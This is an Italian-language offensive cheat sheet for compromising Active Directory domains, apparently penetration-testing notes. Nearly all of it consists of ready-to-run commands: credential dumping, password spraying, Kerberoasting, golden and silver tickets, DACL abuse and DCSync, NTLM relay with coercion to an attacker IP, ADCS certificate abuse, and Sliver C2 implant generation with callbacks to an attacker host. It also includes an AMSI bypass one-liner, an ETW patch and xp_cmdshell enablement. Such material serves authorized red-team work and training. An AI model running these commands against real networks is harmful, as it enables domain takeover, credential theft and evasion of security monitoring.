# AD Overview

## 02 — AD LDAP
**Obiettivo:** enumerare AD via LDAP autenticato e anonimo, estrarre attributi sensibili.
```bash
# Anonimo
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=local"

# Autenticato
ldapsearch -H ldap://<IP> -x -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)"

# Dump completo
ldapdomaindump -u 'domain\user' -p 'pass' <IP>

# Utenti privilegiati (adminCount=1)
windapsearch -d domain.local -u user -p pass --da

# Con NetExec
nxc ldap <IP> -u user -p pass --query "(adminCount=1)" ""
```
**Attributi da cercare:** `memberOf`, `description`, `userAccountControl`, `adminCount`, `pwdLastSet`, `msDS-KeyCredentialLink`

---

## 03 — PowerView
**Obiettivo:** enumerazione completa del dominio da Windows, mappare ACL prima di BloodHound.
```powershell
Import-Module .\PowerView.ps1

# Dominio
Get-Domain; Get-DomainController

# Utenti
Get-DomainUser | select samaccountname,description,memberof
Get-DomainUser -SPN                        # kerberoastable

# Gruppi
Get-DomainGroupMember "Domain Admins"

# Computer
Get-DomainComputer | select dnshostname,operatingsystem

# ACL interessanti
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier

# Share accessibili
Find-DomainShare -CheckShareAccess
```

---

## 04 — BloodHound
**Obiettivo:** raccogliere e visualizzare attack paths verso DA.
```bash
# Raccolta da Linux
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All

# Raccolta da Windows
SharpHound.exe -c All --zipfilename output.zip
```
**Query Cypher utili:**
```cypher
-- Shortest path verso DA
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- Utenti kerberoastable
MATCH (u:User {hasspn:true}) RETURN u.name

-- Owned → DA
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

---

## 05 — Windows Lateral Movement
**Obiettivo:** muoversi lateralmente con credenziali/hash senza cleartext password.
```bash
# Pass-the-Hash
psexec.py -hashes :<NT> domain/user@<IP>
wmiexec.py -hashes :<NT> domain/user@<IP>
evil-winrm -i <IP> -u user -H <NT>

# CME
nxc smb <IP> -u user -H <NT> -x "whoami"

# PTT con Rubeus (Windows)
Rubeus.exe asktgt /user:user /rc4:<NT> /ptt
```

---

## 06 — CrackMapExec / NetExec
**Obiettivo:** enumerazione e exploitation su scala, dump credenziali.
```bash
# Relay list
nxc smb <CIDR> --gen-relay-list no_signing.txt

# Password spray
nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success

# Dump
nxc smb <IP> -u user -p pass --sam
nxc smb <IP> -u user -p pass --lsa
nxc smb <IP> -u user -p pass -M lsassy

# LDAP
nxc ldap <IP> -u user -p pass --bloodhound -c All
```

---

## 07 — Kerberos Attacks
**Obiettivo:** abusare del protocollo Kerberos per ottenere hash craccabili o ticket forgati.
```bash
# AS-REP Roasting (no preauth)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoasting
GetUserSPNs.py domain.local/user:pass -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt

# Golden Ticket (post-DCSync)
ticketer.py -nthash <KRBTGT_NT> -domain-sid <SID> -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local

# Silver Ticket (per servizio specifico)
ticketer.py -nthash <SERVICE_NT> -domain-sid <SID> -domain domain.local -spn cifs/server.domain.local user
```
**Delegation:**
- **Unconstrained** → dump TGT da lsass su macchina delegante
- **Constrained** → S4U2Self + S4U2Proxy
- **RBCD** → scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity`

---

## 08 & 09 — DACL Attacks
**Obiettivo:** abusare di ACE misconfigured per escalare privilegi o prendere controllo di account.

**ACE da cercare:** `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AllExtendedRights`
```bash
# Enum ACL da Linux
dacledit.py -action read -target "victim" domain.local/user:pass

# Shadow Credentials (msDS-KeyCredentialLink write)
pywhisker.py -d domain.local -u attacker -p pass --target victim --action add
# → genera .pfx → certipy auth → NT hash

# ForceChangePassword
net rpc password victim 'NewPass123!' -U domain/attacker%pass -S <DC_IP>

# DCSync (se WriteDACL su dominio)
dacledit.py -action write -target-dn "DC=domain,DC=local" -principal attacker -rights DCSync domain.local/attacker:pass
secretsdump.py domain/attacker:pass@<DC_IP> -just-dc

# BadSuccessor (DACL su dMSA)
# → crea dMSA → eredita credenziali account privilegiato
```

---

## 10 — NTLM Relay
**Obiettivo:** intercettare autenticazioni NTLM e redirigere verso target vulnerabili.

**Condizioni:** SMB signing OFF sul target, relay verso host diverso dalla source.
```bash
# Step 1: targets senza signing
nxc smb <CIDR> --gen-relay-list no_signing.txt

# Step 2: relay verso LDAP (dump / shadow creds / RBCD)
ntlmrelayx.py -tf no_signing.txt -smb2support -t ldap://<DC_IP> --delegate-access

# Step 3: coerce autenticazione
PetitPotam.py -u user -p pass <attacker_ip> <target>
# oppure: printerbug.py domain/user:pass <target> <attacker_ip>

# IPv6 + WPAD
mitm6 -d domain.local &
ntlmrelayx.py -6 -tf no_signing.txt -smb2support --delegate-access

# SOCKS relay
ntlmrelayx.py -tf targets.txt -smb2support -socks
proxychains psexec.py -no-pass domain/user@target
```

---

## 11 — ADCS Attacks
**Obiettivo:** abusare di misconfigurazioni nei template certificati per impersonare utenti privilegiati.
```bash
# Scan
certipy find -u user@domain.local -p pass -dc-ip <DC_IP> -vulnerable -stdout

# ESC1 (enrollee supplies SAN + client auth EKU)
certipy req -u user@domain.local -p pass -ca CA_NAME -template VulnTemplate -upn administrator@domain.local

# ESC8 (relay HTTP endpoint AD CS)
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py <attacker_ip> <DC_IP>

# Cert → TGT → NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```
**ESC map:** ESC1 (SAN), ESC2 (Any Purpose), ESC3 (Enrollment Agent), ESC4 (template write), ESC6 (CA flag), ESC8 (relay), ESC9-13 (vari)

---

## 12 — AD Trust Attacks
**Obiettivo:** attraversare trust tra domini/forest per escalare in ambienti multi-domain.
```bash
# Enum trust
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts

# ExtraSIDs (child → parent domain)
# 1. Ottieni krbtgt del child domain
# 2. Ottieni SID di Enterprise Admins del parent
ticketer.py -nthash <CHILD_KRBTGT_NT> -domain-sid <CHILD_SID> \
  -extra-sid <PARENT_EA_SID> -domain child.domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass parent.domain.local/administrator@dc.parent.domain.local
```

---

## 13 — C2 con Sliver
**Obiettivo:** deployare e gestire implant per post-exploitation persistente e stealth.
```bash
# Server
sliver-server

# Genera implant
generate --mtls <attacker_ip>:443 --os windows --arch amd64 --save implant.exe
generate beacon --http <attacker_ip> --os windows --save beacon.exe

# Listener
mtls --lport 443
http --lport 80

# Comandi base (da sessione attiva)
use <session_id>
info / whoami / ps / netstat
execute -o whoami
upload / download
```

---

## 14 — Windows Evasion
**Obiettivo:** bypassare AMSI, ETW e meccanismi di detection per eseguire tool offensivi.
```powershell
# AMSI bypass (patch in-memory)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW patch
$a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
$b=$a.GetField('m_enabled','NonPublic,Instance')
$arr=@()
[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0),$arr,0,1)
```
**Tecniche chiave:** process injection, process hollowing, PPID spoofing, LOLBins, syscall unhooking (SysWhispers3 / HellsGate), sleep obfuscation.

---

## 15 — MSSQL / Exchange / SCCM

### MSSQL
```bash
mssqlclient.py domain/user:pass@<IP> -windows-auth
# xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
# Linked servers
SELECT * FROM sys.servers;
EXEC('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### Exchange
```bash
# PrivExchange — relay NTLM verso EWS
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user attacker
privexchange.py -u user -p pass -d domain.local <exchange_ip>
```

### SCCM
```bash
# Enum
SharpSCCM.exe get site-info
# NAA credentials
SharpSCCM.exe get naa
# SCCMHunter
python3 sccmhunter.py find -u user -p pass -d domain.local -dc <DC_IP>
```

---

## Attack Flow
```
RECON          → nmap, ldapsearch anonimo, enum4linux
FOOTHOLD       → spray, AS-REP roast, SMB null session
ENUM AUTH      → BloodHound, PowerView, certipy find, LDAP dump
PRIVESC        → Kerberoast, DACL abuse, ADCS ESC*, delegation, relay
LAT MOVEMENT   → PTH, PTT, WMIExec, Evil-WinRM
DA             → DCSync, Golden Ticket, trust attacks
POST-EXPLOIT   → Sliver C2, evasion, persistence
```

---

## Risorse
- https://www.thehacker.recipes
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://github.com/swisskyrepo/PayloadsAllTheThings (AD section)
- https://github.com/ly4k/Certipy
- https://github.com/fortra/impacket
